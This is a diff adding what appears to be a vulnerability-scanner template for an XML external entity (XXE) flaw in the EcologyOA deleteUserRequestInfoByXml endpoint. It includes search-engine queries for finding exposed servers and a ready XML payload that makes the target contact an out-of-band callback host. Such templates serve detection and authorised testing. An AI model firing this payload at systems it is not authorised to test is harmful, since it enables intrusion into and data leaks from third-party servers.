@@ -1,0 +1,29 @@
+id: ecology-oa-byxml-xxe
+info:
+  name: EcologyOA deleteUserRequestInfoByXml - XML External Entity Injection
+  author: SleepingBag945
+  description: 'EcologyOA deleteUserRequestInfoByXml interface has XXE
+
+    '
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: ecology_JSessionid
+    fofa-query: app="泛微-协同办公OA"
+  tags: ecology-oa,xxe
+traps:
+- request:
+    method: POST
+    path: /rest/ofs/deleteUserRequestInfoByXml
+    headers:
+      Content-Type: application/xml
+      Accept-Encoding: gzip
+    body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
+      <M><syscode>&send;</syscode></M>
+  response:
+    status_code: 200
+    headers: {}
+    body: WfData
